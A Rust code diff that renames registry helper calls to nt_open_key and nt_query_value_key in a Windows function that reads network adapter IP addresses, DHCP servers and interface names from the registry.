@@ -7,7 +7,7 @@ use rs2_win32::ntdef::KeyBasicInformation;
 
 use mod_agentcore::instance;
 
-use crate::nt_reg_api::{open_key, query_value};
+use crate::nt_reg_api::{nt_open_key, nt_query_value_key};
 
 /// Main function to get the primary active IP addresses.
 ///
@@ -27,7 +27,7 @@ pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> 
         "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces";
 
     // Open the registry key and obtain a handle
-    let key_handle = match open_key(registry_key) {
+    let key_handle = match nt_open_key(registry_key) {
         Ok(handle) => handle,
         Err(status) => return Err(status),
     };
@@ -70,7 +70,7 @@ pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> 
         let sub_key_path = format!("{}\\{}", registry_key, key_name_str);
 
         // Open the subkey to access its values
-        let sub_key_handle = match open_key(&sub_key_path) {
+        let sub_key_handle = match nt_open_key(&sub_key_path) {
             Ok(handle) => handle,
             Err(_) => {
                 index += 1;
@@ -83,12 +83,12 @@ pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> 
         let mut ip_address = String::new();
 
         // Check if both DhcpIPAddress and DhcpServer values exist
-        if let Ok(ip_address_value) = query_value(sub_key_handle, "DhcpIPAddress\0") {
-            if let Ok(dhcp_server_value) = query_value(sub_key_handle, "DhcpServer\0") {
+        if let Ok(ip_address_value) = nt_query_value_key(sub_key_handle, "DhcpIPAddress\0") {
+            if let Ok(dhcp_server_value) = nt_query_value_key(sub_key_handle, "DhcpServer\0") {
                 ip_address = ip_address_value;
                 dhcp_server = dhcp_server_value;
             }
-        } else if let Ok(ip_address_value) = query_value(sub_key_handle, "IPAddress\0") {
+        } else if let Ok(ip_address_value) = nt_query_value_key(sub_key_handle, "IPAddress\0") {
             ip_address = ip_address_value;
         }
 
@@ -106,7 +106,7 @@ pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> 
         );
 
         // Open the key to read the interface name
-        let name_key_handle = match open_key(&name_key_path) {
+        let name_key_handle = match nt_open_key(&name_key_path) {
             Ok(handle) => handle,
             Err(_) => {
                 index += 1;
@@ -115,7 +115,7 @@ pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> 
         };
 
         // Query the "Name" value from the connection key
-        if let Ok(name_value) = query_value(name_key_handle, "Name\0") {
+        if let Ok(name_value) = nt_query_value_key(name_key_handle, "Name\0") {
             name = name_value;
         }
 
